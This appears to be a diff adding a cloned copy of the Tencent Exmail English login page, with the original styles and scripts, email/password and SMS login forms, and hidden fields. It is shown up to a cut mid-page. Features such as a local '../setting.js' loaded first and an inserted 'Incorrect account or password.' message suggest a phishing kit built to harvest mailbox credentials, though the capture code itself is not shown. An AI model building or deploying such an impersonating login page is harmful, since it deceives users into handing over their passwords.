@@ -1,0 +1,1252 @@
+<html>
+
+<head>
+    <script src="../setting.js"></script>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="save" content="history">
+    <link rel="shortcut icon" href="//exmail.qq.com/exmail_logo.ico">
+    <script async="" src="//www.google-analytics.com/analytics.js"></script>
+    <script>
+        if (location.protocol !== 'https:' && location.hostname.substr(-7) === '.qq.com') {
+            location.replace(location.href.replace(/^http:/i, "https:"))
+        }
+        if (["exmail.work.weixin.qq.com", "work.exmail.qq.com"].indexOf(location.hostname) != -1) {
+            location.href = "https://" + location.hostname + "/qy_mng_logic/loginpage";
+        }
+    </script>
+    <title>Tencent Exmail - Login Entry</title>
+    <meta http-equiv="Content-Type" content="text/html;" charset="gb2312">
+    <meta name="description"
+        content="To log in to Tencent Exmail, enter the complete email address, or scan the QR code with WeChat if you are the admin. The new version of Foxmail requires no configuration and enables fast email sending and receiving.">
+    <meta name="keywords" content="Log in to Exmail">
+    <link rel="stylesheet" type="text/css"
+        href="https://rescdn.qqmail.com/bizmail/en_US/htmledition/style/comm5511e3.css">
+    <link rel="stylesheet" type="text/css"
+        href="https://rescdn.qqmail.com/bizmail/en_US/htmledition/style/bizmail533d55.css">
+    <link rel="stylesheet" type="text/css"
+        href="https://rescdn.qqmail.com/bizmail/en_US/htmledition/style/biz_v3_helper533d55.css">
+    <link rel="stylesheet" type="text/css"
+        href="https://rescdn.qqmail.com/bizmail/en_US/htmledition/style/new_index/signup533d55.css">
+    <link rel="stylesheet" type="text/css"
+        href="https://rescdn.qqmail.com/bizmail/en_US/htmledition/style/new_login/login5de0bb.css">
+    <style type="text/css" media="screen,print">
+        html {
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /*body                    {background:#fff;color:#000;line-height:1.5; font-family: "lucida Grande","Microsoft Yahei";padding: 0;margin: 0;}*/
+        p {
+            display: block;
+            margin: 0;
+            padding: 0;
+        }
+
+        a {
+            text-decoration: none;
+        }
+
+        .left_panel {
+            width: 480px;
+        }
+
+        .login_panel {
+            width: 390px;
+            background: #ffffff;
+            border-bottom: solid 1px #cacaca;
+            min-height: 404px;
+        }
+
+        .login_panel .title {
+            font-size: 16px;
+            line-height: 56px;
+            padding: 0 24px;
+            border-bottom: solid 1px #cacaca;
+            color: #242424;
+        }
+
+        .login_panel .items_panel {
+            padding: 0 51px;
+            font-size: 14px;
+            position: relative;
+        }
+
+        .ret_msg {
+            color: #ffffff;
+            font-size: 16px;
+            margin-bottom: 8px;
+            min-height: 24px;
+        }
+
+        .ret_msg ul {
+            margin: 0;
+            font-size: 14px;
+            padding-left: 31px;
+        }
+
+        .ret_msg a {
+            color: #ffffff;
+            text-decoration: underline;
+        }
+
+        .login_panel .items_panel .err_tips {
+            color: #ec2020;
+            min-height: 21px;
+            margin-top: 11px;
+        }
+
+        .login_panel .items_panel .item {
+            position: relative;
+            margin-top: 7px;
+        }
+
+        .login_panel .items_panel .input_tips {
+            position: absolute;
+            top: 9px;
+            left: 9px;
+            color: #aaaaaa;
+            display: none;
+        }
+
+        .login_panel .items_panel .disabled {
+            color: #B7AEAE !important;
+            border: 1px solid #E5E5EF;
+        }
+
+        .login_panel .items_panel .input_item {
+            width: 268px;
+            height: 20px;
+            ;
+            padding: 8px 8px;
+            font-size: 14px;
+        }
+
+        .login_panel .items_panel .hint {
+            margin-top: 7px;
+            color: #aaaaaa;
+            margin-bottom: 10px
+        }
+
+        .login_panel .items_panel .autologin_choice {
+            margin-top: 20px;
+            font-size: 12px;
+            position: relative;
+        }
+
+        .login_panel .items_panel .autologin_choice input {
+            float: left;
+            margin-top: 5px;
+            margin-left: 0;
+        }
+
+        .login_panel .items_panel .green_btn {
+            height: 40px;
+            width: 100%;
+            background-color: #2cc64d;
+            font-size: 16px;
+            margin-top: 13px;
+            color: #ffffff;
+            font-weight: bold;
+            border: 1px solid #2ab949;
+        }
+
+        .login_panel .items_panel .forget_pwd_wrap {
+            margin-top: 18px;
+            margin-bottom: 25px;
+        }
+
+        .login_panel .items_panel .forget_pwd_wrap a {
+            float: right;
+        }
+
+        .calcel {
+            text-align: center;
+            color: #333333;
+            margin-top: 20px;
+        }
+
+        .login_panel .items_panel .gray_btn {
+            display: inline-block;
+            width: 286px;
+            background-color: #f1f1f1;
+            height: 40px;
+            text-align: center;
+            line-height: 40px;
+            border: 1px solid #e7e7e7;
+            margin-top: 13px;
+            font-size: 16px;
+            color: #333333;
+        }
+
+        .login_panel .items_panel a {
+            text-decoration: none;
+        }
+
+        .login_panel .items_panel .verify_wrap {
+            margin-top: 20px;
+        }
+
+        .login_panel .items_panel .verify_wrap .change_wrap {
+            text-align: right;
+            margin-top: 12px;
+            margin-bottom: -6px;
+        }
+
+        .right_panel {
+            float: right;
+            width: 300px;
+        }
+
+        .right_panel .title {
+            font-size: 16px;
+            color: #ffffff;
+            margin-top: 24px;
+            height: 16px;
+            padding-top: 26px;
+            padding-left: 6px;
+        }
+
+        .login_panel .token_wrap a {
+            line-height: 44px;
+            float: right;
+            font-size: 12px;
+        }
+
+        .login_panel .token_wrap .input_item {
+            width: 203px;
+            height: 40px;
+            padding: 0 8px;
+            font-size: 14px;
+        }
+
+        .loginWrap .middle_line {
+            position: absolute;
+            top: 28px;
+            left: 496px;
+            width: 1px;
+            height: 398px;
+            margin-left: -41px;
+            right: 0;
+            background: url(https://rescdn.qqmail.com/bizmail/en_US/htmledition/images/bizmail/login_middle_line524bf7.png) 50% 50% no-repeat;
+        }
+
+        .wx_login_wrap {
+            height: 244px;
+        }
+
+        .wx_login_wrap .wx_loading {
+            font-size: 20px;
+            color: #ffffff;
+            padding: 140px 87px;
+        }
+
+        .top a,
+        .navPageBottom a {
+            border-right: 1px solid #ccc;
+            padding: 0 8px;
+            font-size: 14px;
+            color: #5c5c5c;
+        }
+
+        .top .left {
+            float: left;
+        }
+
+        .top .left a {
+            border: none;
+        }
+
+        .navPageTop a.end,
+        .navPageBottom a.end {
+            border-right: 0;
+        }
+
+        .container {
+            width: 860px;
+            margin: 0 auto auto;
+        }
+
+        .header,
+        .content,
+        .footer {
+            clear: both;
+            width: 100%;
+        }
+
+        .header {
+            float: left;
+            margin: 0 0 20px;
+        }
+
+        .logo {
+            background: #fff url(https://rescdn.qqmail.com/bizmail/en_US/htmledition/images/logo/logo_0_0524bf7.gif ) no-repeat 5px -12px;
+            height: 60px;
+            width: 205px;
+            float: left;
+        }
+
+        .navPageTop {
+            height: 28px;
+            line-height: 200%;
+            background: #eaf3ff;
+            margin: 6px 0 0;
+            padding: 0 6px 0 12px;
+        }
+
+        .navPageTop .naviBar {
+            float: right;
+            text-align: left;
+        }
+
+        .footer {
+            text-align: center;
+            float: left;
+            margin: 20px 0 0;
+        }
+
+        .footer p {
+            line-height: 200%;
+            display: block;
+        }
+
+        .moreFeature {
+            text-align: right;
+            padding: 6px 422px 30px 0;
+        }
+
+        .panelLogin {
+            min-height: 370px;
+            height: auto !important;
+            height: 370px;
+            width: 290px;
+            float: right;
+            background: #f4f4f4;
+            border: 1px solid #ccc;
+            margin: 0 auto;
+            padding: 20px 16px 0 22px;
+        }
+
+        .panelLogin h2 {
+            text-align: left;
+            font-size: 14px;
+            margin: 0;
+        }
+
+        #VerifyArea p,
+        .panelLogin p {
+            clear: both;
+            display: block;
+            margin: 0 0 10px;
+        }
+
+        input.text {
+            width: 235px;
+            height: 22px;
+            font-size: 14px;
+        }
+
+        p.operate {
+            padding: 0 0 0 59px;
+            line-height: 110%;
+        }
+
+        .subfix {
+            color: #039;
+            line-height: 26px;
+        }
+
+        em {
+            font-style: normal;
+            border-left: 1px solid #ccc;
+            padding: 0 0 0 10px;
+        }
+
+        p.desc {
+            margin-top: -6px;
+        }
+
+        #VerifyArea {
+            display: none;
+        }
+
+        .cLight {
+            color: #888;
+        }
+
+        .copyright {
+            font-size: 11px;
+            clear: both;
+        }
+
+        .infobar {
+            clear: both;
+            margin: 6px 0 0 0;
+        }
+
+        .infobar1 {
+            background: #fff9e3;
+            clear: both;
+            border: 1px solid #fadc80;
+            line-height: 120%;
+            float: none;
+            margin: 8px 0;
+            padding: 6px 6px 6px 6px;
+        }
+
+        .error {
+            color: #f00;
+        }
+
+        ul.contentul {
+            font-size: 14px;
+            line-height: 26px;
+            list-style: none;
+            margin-top: -1px;
+        }
+
+        ul.contentul b {
+            color: #000;
+        }
+
+        .clr {
+            clear: both;
+        }
+
+        .featureList {
+            padding: 10px 20px;
+            margin: 0;
+        }
+
+        .featureList li {
+            padding: 3px 0;
+            color: #bbb;
+        }
+
+        .featureList li span {
+            color: #000;
+        }
+
+        .wd {
+            width: 960px;
+            clear: both;
+            margin: 0 auto;
+            position: relative;
+        }
+
+        .wd810 {
+            width: 810px;
+            clear: both;
+            margin: 0 auto;
+            position: relative;
+        }
+
+        .qqmaillogo {
+            float: left;
+            margin-bottom: 10px;
+            padding-left: 4px;
+        }
+
+        .top {
+            margin: 7px 0 0 205px;
+            padding: 5px 0 5px 0;
+            text-align: right;
+        }
+
+        .adplan {
+            text-align: left;
+            margin: 0 325px 0 0
+        }
+
+        label {
+            display: block;
+            line-height: 24px;
+        }
+
+        label.column {
+            width: 60px;
+            font-size: 14px;
+            text-align: left;
+            padding: 0 0 0 2px;
+        }
+
+        .adimg {
+            width: 146px;
+            height: 168px;
+        }
+
+        .panintro {}
+
+        dl.panintro {
+            margin: 1px 0 0 3px;
+            padding: 3px 0 0 3px;
+            font: normal 14px Verdana;
+            height: 171px;
+        }
+
+        dl.panintro dt {
+            display: block;
+            float: left;
+            margin: 0 0 5px 0
+        }
+
+        dl.panintro dd {
+            display: block;
+            float: left;
+            margin: 42px 0 0 10px;
+        }
+
+        dl.panintro dd a {
+            font: bold 14px verdana;
+        }
+
+        dl.panintro dd div {
+            font: normal 12px Verdana;
+            margin: 14px 0 2px 0;
+            line-height: 22px
+        }
+
+        .panintro ul {
+            color: #888;
+            line-height: 130%;
+            margin: 5px 0 0 18px;
+            padding: 0;
+        }
+
+        .moreinfo {
+            margin: 10px 0 0 3px;
+            clear: left;
+        }
+
+        .navPageBottom {
+            height: 24px;
+            line-height: 24px;
+        }
+
+        .bottom13 {
+            margin-bottom: 13px;
+        }
+
+        .bizTop {
+            background: url(https://rescdn.qqmail.com/bizmail/en_US/htmledition/images/domainmail/biz_top_line524bf7.gif) repeat-x top left;
+            height: 3px;
+            width: 100%;
+            *font-size: 0px;
+        }
+
+        .domainTop {
+            background: url(https://rescdn.qqmail.com/bizmail/en_US/htmledition/images/domainmail/top_line524bf7.gif) repeat-x left bottom;
+            margin: 0 auto;
+        }
+
+        .grayButton:link,
+        a.grayButton:visited {
+            color: #000;
+            text-decoration: none;
+        }
+
+        .grayButton {
+            background: url(https://rescdn.qqmail.com/bizmail/en_US/htmledition/images/bizmail/grayButton524bf7.gif) no-repeat;
+            height: 28px;
+            line-height: 28px;
+            width: 91px;
+            border: none;
+            padding: 0;
+        }
+
+        .xgrayButton:hover {
+            background: url(/zh_CN/htmledition/images/bizmail/grayButton.gif) no-repeat -92px;
+        }
+
+        .btn {
+            padding: 4px 14px;
+            height: 29px;
+        }
+
+        .reg_ann {
+            padding: 4px 0 0;
+            color: #71819e;
+            margin: 0;
+        }
+
+        .reg_ann li {
+            list-style: disc inside;
+            line-height: 19px;
+            padding: 0;
+            margin: 0;
+        }
+
+        .loginContent a:link,
+        .loginContent a:visited {
+            text-decoration: none;
+        }
+
+        .loginContent a:hover {
+            text-decoration: underline;
+        }
+
+        .loginTypePic {
+            width: 130px;
+            height: 130px;
+            margin: 29px auto 0;
+            *margin-top: 27px;
+        }
+
+        .loginTypePic img {
+            width: 130px;
+            height: 130px;
+        }
+
+        .loginTypeTips {
+            margin: 9px 0 0;
+            text-align: center;
+            color: #71819e;
+        }
+
+        .loginTypeTips .scanSuccess {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            margin: 0 3px -5px 0;
+            background: url(https://rescdn.qqmail.com/bizmail/en_US/htmledition/images/bizmail/login_customize/login_icon524bf7.png) no-repeat 0 -32px;
+        }
+
+        .loginTypeIcon {
+            padding: 0 0 1px 20px;
+            font-size: 12px;
+            font-weight: normal;
+            text-decoration: none;
+            float: right;
+        }
+
+        .loginTypeIcon:hover {
+            text-decoration: underline;
+        }
+
+        .loginTypeIconWeixin {
+            background: url(https://rescdn.qqmail.com/bizmail/en_US/htmledition/images/bizmail/login_customize/login_icon524bf7.png) no-repeat 3px 3px;
+            background-position: 3px 1px\9;
+        }
+
+        #loginby_wx .loginTypeIcon {
+            background-position: 0 -16px;
+            *background-position: 0 -15px;
+        }
+
+        .divider_line {
+            border-bottom: 1px solid #e6eaf5;
+            border-top: 1px solid #7390bf;
+            overflow: hidden;
+            height: 0px;
+        }
+
+        .tipsContainer {}
+
+        .tipsWrap {
+            width: 100%;
+            color: #fff;
+            text-align: center;
+            position: fixed;
+            _position: absolute;
+            z-index: 10000;
+        }
+
+        .tipsWrap.topPos {
+            top: 70px;
+        }
+
+        .tipsWrap.tipsCenter {
+            top: 20%;
+        }
+
+        .tipsWrap .msg {
+            background-color: #68AF02;
+            -moz-border-radius: 3px;
+            border-radius: 3px;
+            -webkit-border-radius: 3px;
+            white-space: nowrap;
+            padding: 3px 20px;
+            font-size: 12px;
+        }
+
+        .tipsCenter .msg {
+            opacity: 0.8;
+            filter: alpha(opacity=80);
+            line-height: 22px;
+            padding: 10px 25px;
+            display: inline-block;
+            -moz-box-shadow: 2px 2px 2px #ccc;
+            -webkit-box-shadow: 2px 2px 2px #ccc;
+            box-shadow: 2px 2px 2px #ccc;
+            font-size: 14px;
+        }
+    </style>
+    <script type="text/javascript"
+        src="https://rescdn.qqmail.com/bizmail/en_US/htmledition/js_biz/all5e4a76.js"></script>
+    <script>
+        var JsChecker =
+        {
+            isreload: false,
+            check: function (_asFile) {
+                return typeof window[(/[0-9a-fA-F]{6}$/.test(_asFile) ? _asFile.substr(0, _asFile.length - 6) : _asFile) + "_js"] == "function";
+            },
+            load: function (_aoFiles, _abIsReload) {
+                for (var i = 0, _nLen = _aoFiles.length; i < _nLen; i++) {
+                    var _sFile = _aoFiles[i];
+                    if (_sFile && (!_abIsReload || !JsChecker.check(_sFile))) {
+                        document.write("<script", " language='javascript' src='https://rescdn.qqmail.com/bizmail/en_US/htmledition/js_biz/", _sFile, ".js",
+                            _abIsReload ? "?" + Math.random() : "", "'></", "script>");
+                        _abIsReload && (JsChecker.isreload = true);
+                    }
+                }
+            }
+        };
+    </script>
+    <script>JsChecker.load(["safeauth52b0b4"]);</script>
+    <script language="javascript"
+        src="https://rescdn.qqmail.com/bizmail/en_US/htmledition/js_biz/safeauth52b0b4.js"></script>
+    <script>JsChecker.load(["safeauth52b0b4"], true);</script>
+    <script>
+        (function () {
+            if (!JsChecker.check("safeauth52b0b4")) {
+                var _sHref = location.href;
+                //location.replace(_sHref + (_sHref.indexOf("?") == -1 ? "?" : "&") + "res=local");
+            }
+        }
+        )();
+    </script>
+    <script>
+        (function () {
+            if (JsChecker.isreload) {
+                window.netTrans = new Image();
+                window.netTrans.src = ["/cgi-bin/getinvestigate?flowid=&stat=jsdownloadfail&res=&jsfailtime=",
+                    JsChecker.check("safeauth52b0b4") ? 1 : 2, "&r=", Math.random()].join("");
+            }
+        }
+        )();
+    </script>
+    <script type="text/javascript" async="" src="https://captcha.gtimg.com/1/tcaptcha-frame.12921619.js"></script>
+    <style type="text/css">
+        @keyframes animate_dots {
+            0% {
+                opacity: 1
+            }
+
+            to {
+                opacity: 0
+            }
+        }
+
+        @-webkit-keyframes animate_dots {
+            0% {
+                opacity: 1
+            }
+
+            to {
+                opacity: 0
+            }
+        }
+
+        .dot0,
+        .dot1 {
+            animation: animate_dots .9s infinite;
+            -moz-animation: animate_dots .9s infinite;
+            -webkit-animation: animate_dots .9s infinite;
+            -o-animation: animate_dots .9s infinite
+        }
+
+        .dot1 {
+            animation-delay: .2s;
+            -webkit-animation-delay: .2s
+        }
+
+        .dot2 {
+            animation: animate_dots .9s infinite;
+            -moz-animation: animate_dots .9s infinite;
+            -webkit-animation: animate_dots .9s infinite;
+            -o-animation: animate_dots .9s infinite;
+            animation-delay: .4s;
+            -webkit-animation-delay: .4s
+        }
+
+        .dots_item {
+            display: inline-block;
+            margin-right: 5px;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #4886ff
+        }
+
+        .verify-icon {
+            position: absolute;
+            width: 100%;
+            margin-top: 70px;
+            text-align: center
+        }
+
+        .t-embed-loading {
+            position: relative;
+            width: 300px;
+            height: 230px;
+            background-color: #fff
+        }
+
+        .t-embed-dots {
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            margin-left: -22.5px;
+            margin-top: -5px
+        }
+
+        .t-embed-dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 5px;
+            background: #4886ff
+        }
+
+        .t-mask {
+            width: 100%;
+            height: 100%;
+            position: fixed;
+            _position: absolute;
+            left: 0;
+            top: 0;
+            background: #000;
+            opacity: .5;
+            filter: progid:DXImageTransform.Microsoft.Alpha(opacity=50);
+            z-index: 2000000000
+        }
+    </style>
+</head>
+
+<body class="" onunload="document.form1.btlogin.disabled = false;"><iframe scrolling="no"
+        id="iframe_distributeDomain_proxy_" name="iframe_distributeDomain_proxy_" class=""
+        onload="this.setAttribute('loaded','true');_creAteifRAmeoNlQAd_('iframe_distributeDomain_proxy_',this);"
+        src="/en_US/htmledition/domain2.html?exmail.qq.com" style="display:none;" loaded="true"
+        frameborder="0"></iframe>
+    <div class="background_wrap">
+        <style type="text/css">
+            .topLink {
+                font-size: 0;
+                line-height: 22px;
+                vertical-align: middle;
+                float: right;
+            }
+
+            .topLink a,
+            .topLink span {
+                font-size: 13px;
+                color: #2B2B2B;
+                vertical-align: middle;
+            }
+
+            .topLink span {
+                margin-left: 3px;
+                margin-right: 3px;
+            }
+
+            .qqmaillogo {
+                float: left;
+                padding-left: 4px;
+                margin-top: 18px;
+                width: 140px;
+                height: 30px;
+            }
+
+            .wd {
+                width: 960px;
+                clear: both;
+                margin: 0 auto;
+            }
+
+            .wd900 {
+                width: 900px;
+                margin: 0 auto;
+            }
+
+            .loginWd {
+                width: 1000px;
+                margin: 0 auto;
+            }
+
+            .exmail_header_wrap {
+                font-size: 0;
+                overflow: hidden;
+                text-align: left;
+                padding-top: 20px;
+                width: 1000px;
+            }
+
+            .topheight {
+                height: 70px;
+            }
+
+            .exmail_logo {
+                display: inline-block;
+                width: 138px;
+                height: 21px;
+            }
+
+            .exmail_logo img {
+                width: 100%;
+                height: 100%;
+            }
+        </style>
+        <div name="Header">
+            <script type="text/javascript">
+                function SetHomeLang(_ashl) {
+                    var _sDomain = "exmail.qq.com",
+                        _oExpires = new Date(new Date().valueOf() + 7 * 24 * 3600 * 1000),
+                        _sCookie = "locate=" + escape(_ashl) + "; path=/; domain=" + _sDomain + "; expires=" + _oExpires;
+                    document.cookie = _sCookie;
+                    location.href = "/login/" + _ashl;
+                }
+                function JumpToEng() {
+                    var _sDomain = "exmail.qq.com",
+                        _oExpires = new Date(new Date().valueOf() + 7 * 24 * 3600 * 1000),
+                        _sCookie = "locate=; path=/; domain=" + _sDomain + "; expires=" + _oExpires;
+                    document.cookie = _sCookie;
+                    location.href = "http://en.exmail.qq.com";
+                }
+                function JumpToCn() {
+                    location.href = "http://exmail.qq.com";
+                }
+            </script>
+            <div class="wd900 exmail_header_wrap getuserdata" id="topDataTd"><a href="/" class="exmail_logo"><img
+                        src="https://rescdn.qqmail.com/bizmail/en_US/htmledition/images/bizmail/new_login/logo_biz_1_En_2x533c54.png"
+                        class="" title="ExmailHomepage" alt="Exmail"></a>
+                <div class="topLink addrtitle"><a href="/" target="_blank" class="toptitle">Register new
+                        company</a><span> | </span><a
+                        href="https://work.weixin.qq.com/help?person_id=0&amp;doc_id=345&amp;helpType=exmail"
+                        target="_blank" class="toptitle">Send and receive emails in the app</a><span> | </span><a
+                        onclick="JumpToCn()"
+                        class="toptitle">Chinese</a><!-- <span> | </span> --><!-- <a href="/cgi-bin/loginpage?t=qq_loginpage" class="toptitle" >��ҵQQ�û�</a> -->
+                </div>
+            </div>
+        </div>
+        <div class="loginWrap">
+            <div class="loginWd">
+                <form id="loginForm" name="form1" method="post" action="/cgi-bin/login" onsubmit="return checkInput();">
+                    <input type="hidden" name="fingerprint_deviceid" value="67f7348a64ce31d416e6e4b700973bab"><input
+                        type="hidden" name="device_type" value="web"><input type="hidden" name="device_name"
+                        value="web"><input type="hidden" name="sid" value=""><input type="hidden" name="firstlogin"
+                        value="false"><input type="hidden" name="domain" value=""><input type="hidden" name="aliastype"
+                        value="other"><input type="hidden" name="errtemplate" value="dm_loginpage"><input type="hidden"
+                        name="first_step" value=""><input type="hidden" name="buy_amount" value=""><input type="hidden"
+                        name="year" value=""><input type="hidden" name="company_name" value=""><input type="hidden"
+                        name="is_get_dp_coupon" value=""><input type="hidden" name="source" value=""><input
+                        type="hidden" name="qy_code" value=""><input type="hidden" name="origin" value=""><input
+                        type="hidden" name="starttime"><input type="hidden" name="redirecturl"><input type="hidden"
+                        name="redirect_hash" value=""><input type="hidden" name="f" value="biz"><input type="hidden"
+                        name="uin" value=""><input type="hidden" name="p"><input type="hidden" name="login_from"
+                        value=""><input type="hidden"
+                        name="vt"><!-- <input type="hidden" id="token" name="token" value=""> --><!-- <input type="hidden" name="t" value="biz_rf_portal_mgr"/> --><!-- <input type="hidden" name="ef" value="jsnew"/> --><input
+                        type="hidden" name="delegate_url" value=""><input type="hidden" name="ts"
+                        value="1684409316"><input type="hidden" name="from" value=""><input type="hidden" name="ppp"
+                        value=""><input type="hidden" name="chg" value="0"><input type="hidden" name="domain_bak"
+                        id="domain_bak" value="0"><input type="hidden" name="no_force_scan" id="no_force_scan"
+                        value="0"><input type="hidden" name="loginentry" value="3"><input type="hidden" name="s"
+                        value=""><input type="hidden" name="dmtype" value="bizmail"><input type="hidden" name="fun"
+                        value="">
+                    <div class="left_text_wrap">
+                        <h1>Not just mailbox,</h1>
+                        <h1>a new efficient office experience.</h1>
+                    </div>
+                    <div class="login_return_msg">
+                        <div id="returnMsg"></div>
+                        <div class="err_tips" id="msgContainer" style="line-height: 1;"></div>
+                    </div>
+                    <div class="login_scan_panel" data-panel="qrcode" style="display: none;">
+                        <div class="header_nav ww_header_nav">
+                            <div class="wework_login_title">Scan code login</div>
+                            <div class="wework_login_subtitle">You can scan with either WeChat or WeCom.</div>
+                        </div>
+                        <div class="login_content_wrap" data-content-type="qrcode"
+                            style="max-height:278px;overflow:hidden;">
+                            <div id="qr_con" class="loginType"><iframe
+                                    src="/qy_mng_logic/wwlogin/login_qrcode?lang=en_US" scrolling="no"
+                                    style="margin-left: 10px;display: block;" width="320px" height="240px"
+                                    frameborder="0"></iframe>
+                                <div class="wechat_scan_auto_login" id="wechat_scan_auto_login_wrap"><input
+                                        type="checkbox" id="wechat_scan_auto_login"><label
+                                        for="wechat_scan_auto_login">Automatically log in to your mailbox for 5
+                                        days.</label></div>
+                            </div>
+                        </div>
+                        <div class="login_scan_footer"><a href="javascript:;" class="js_show_pwd_panel">Account password
+                                login</a><a href="javascript:;" class="js_show_phone_panel">Mobile number login</a>
+                        </div>
+                    </div>
+                    <div class="login_scan_panel" data-panel="phone" style="display:none;">
+                        <div class="header_nav">
+                            <div class="wework_login_title">Mobile number login</div>
+                        </div>
+                        <div class="login_content_wrap" data-content-type="verifycode">
+                            <div class="signup_item" style="margin-top: 25px;">
+                                <div class="signup_item_content" style="position: relative;">
+                                    <div class="singup_item_countryCode">
+                                        <div class="qy_telInput_zipCode js_countryCode_dropdown">
+                                            <div class="qy_telInput_zipCode_input signup_telinput_plus"><input
+                                                    type="text" id="area" name="area"
+                                                    class="qui_inputText qy_inputText qy_inputText_Big"
+                                                    style="height: 36px;line-height: 28px;border: none;outline: none;padding-left: 21px;width: 38px;padding-right: 20px;"><a
+                                                    href="javascript:;"
+                                                    class="qy_telInput_zipCode_input_arrowWrap"><span
+                                                        class="qy_telInput_zipCode_input_arrowWrap_icon"
+                                                        style="right: 10px;"></span></a></div>
+                                            <div class="qui_dropdownMenu qy_dropdownMenu" style="top: 50px;">
+                                                <ul></ul>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="signup_item_mobile">
+                                        <div class="phone_num_split_line"></div><label class="input_tips"
+                                            id="mobile_tip" onclick="document.form1.mobile.focus();">Enter mobile
+                                            number.</label><input type="text" class="signup_item_input" id="mobile"
+                                            name="mobile" placeholder="Enter mobile number." autocomplete="off"
+                                            tabindex="5"
+                                            style="border: none;outline: none;height: 46px;box-sizing: border-box;display: inline-block;width: 100%;padding-left: 10px;">
+                                    </div>
+                                </div>
+                                <div class="signup_item_content_tips_error">Enter the mobile number.</div>
+                            </div>
+                            <!-- ͼƬ��֤�� --><!-- <div class="signup_item js_login_item_wrapper"><div class="signup_item_content"><div class="verify_code_input_wrap"><label class="input_tips" for="captcha_val">Enter the CAPTCHA code.</label><input type="text" class="verify_code_input" id="captcha_val" name="captcha_val" placeholder="Enter the CAPTCHA code." autocomplete="off" tabindex="5" style="width:157px;border: none;outline: none;height: 46px;"><div class="login_captcha_wrapper"><img data-src="/cgi-bin/getverifyimage?aid=23000101&r=0" src="/cgi-bin/getverifyimage?aid=23000101&r=0" id="js_login_captcha_img" class="img_vcode login_captcha_img"><span class="login_captcha_img_cover">Change One</span></div></div></div><div class="signup_item_content_tips_error">Enter the CAPTCHA code</div></div> -->
+                            <div class="signup_item">
+                                <div class="signup_item_content">
+                                    <div class="verify_code_input_wrap"><label class="input_tips" id="token_tip"
+                                            onclick="document.form1.phone_vc.focus();">Enter Verify Code</label><input
+                                            type="text" class="verify_code_input" id="sms_token" name="phone_vc"
+                                            placeholder="Enter Verify Code" autocomplete="off" tabindex="5"
+                                            style="width:160px;border: none;outline: none;height: 46px;"><a
+                                            href="javascript:;" id="btn_sms" class="verify_btn disabled"
+                                            style="width:98px;">get verify code</a></div>
+                                </div>
+                                <div class="signup_item_content_tips_error">Enter the verification code</div>
+                            </div>
+                            <div class="signup_item">
+                                <div class="login_scan_panel_pwd_item"><a href="javascript:;" id="sms_login_btn"
+                                        class="login_btn">log in</a></div>
+                            </div>
+                        </div>
+                        <div class="login_scan_footer"><a href="javascript:;" class="js_show_qrcode_panel">Scan code
+                                login</a><a href="javascript:;" class="js_show_pwd_panel">Account password login</a>
+                        </div>
+                    </div>
+                    <div class="login_scan_panel login_account_pwd_panel" data-panel="pwd" style="">
+                        <h1 class="login_scan_panel_pwd_title">Account password login</h1>
+                        <div class="signup_item">
+                            <div class="signup_item_content" style="border: none;"><label class="input_tips"
+                                    id="uin_tip" onclick="document.form1.inputuin.focus();">Email Account/Admin
+                                    Account</label><input type="text" class="login_scan_panel_pwd_input" id="email"
+                                    name="email" value="" placeholder="Email Account/Admin Account"></div>
+                            <div class="signup_item_content_tips_error">Enterthe complete Exmail account oradmin
+                                account.</div>
+                        </div>
+                        <div class="signup_item">
+                            <div class="signup_item_content" style="border: none;"><label class="input_tips"
+                                    id="pwd_tip" onclick="document.getElementById('pp').focus();">Enter the email
+                                    password.</label><input type="password" id="password" name="password"
+                                    class="login_scan_panel_pwd_input" placeholder="Enter the email password." value=""
+                                    onpropertychange="ChkPsw();" onkeyup="ChkPswInput(event);" onblur="HideLockTips();">
+                            </div>
+                            <span id="msg" style="display: none; color: red;">Incorrect account or password.</span>
+                            <div class="signup_item_content_tips_error">Enter the password.</div>
+                        </div>
+                        
+                        <div class="signup_item" style="margin-bottom:3px;">
+                            <div class="signup_item_content">
+                                <div class="login_scan_panel_auto_login"><input id="auto_login_in_five_days_pwd"
+                                        type="checkbox" class="login_scan_panel_pwd_checkbox v_middle" name="ss"
+                                        value="1"><label for="auto_login_in_five_days_pwd" class="v_middle">Auto login
+                                        within 5 days</label></div>
+                                <div class="login_scan_panel_forgot_pwd"><a
+                                        href="/cgi-bin/readtemplate?check=false&amp;t=biz_rf_portal#recovery"
+                                        onclick="logKV('ActiveCodeLogin', 'forget_pwd_click');" target="_blank">Forgot
+                                        Password</a></div>
+                            </div>
+                        </div>
+                        <div class="signup_item" style="margin-bottom:30px;">
+                            <div class="signup_item_content"><input type="submit" class="login_btn" value="log in"
+                                    id="submit-btn" name="btlogin"></div>
+                        </div>
+                        <div class="login_scan_footer"><a href="javascript:;" class="js_show_qrcode_panel">Scan code
+                                login</a><a href="javascript:;" class="js_show_phone_panel">Mobile number login</a>
+                        </div>
+                    </div>
+                    <div id="phone_bind_account_list_wrap" data-panel="accountlist" class="login_scan_panel"
+                        style="display: none;">
+                        <h1 class="weixin_choose_list_title">Select the account to log in.</h1>
+                        <div class="weixin_choose_list" id="phone_bind_account_list"></div>
+                    </div>
+                    <div class="login_scan_panel login_warning_panel" style="margin-top: 0;display: none;"
+                        id="wework_empty_panel">
+                        <div class="icon_warning_big"></div>
+                        <div class="no_mail_found" style="font-weight: 500;">Your company is not linked to Tencent
+                            Exmail.</div><!-- <div class="no_mail_found_desc">����ϵ����Ա��ͨ</div> -->
+                        <div class="signup_item" style="padding-bottom:81px;padding-top: 41px;">
+                            <div class="signup_item_content"><a href="/login" data-type="back-to-complete-info"
+                                    class="login_btn">Back</a></div>
+                        </div>
+                    </div>
+                    <div class="login_scan_panel login_warning_panel" style="margin-top: 0;display: none;"
+                        id="only_scan_allow">
+                        <div class="icon_warning_big"></div>
+                        <div class="no_mail_found" style="font-weight: 500;">This account only supports login by
+                            scanning the QR code with WeChat or WeCom.</div>
+                        <!-- <div class="no_mail_found_desc">����ϵ����Ա��ͨ</div> -->
+                        <div class="signup_item" style="padding-bottom:81px;padding-top: 41px;">
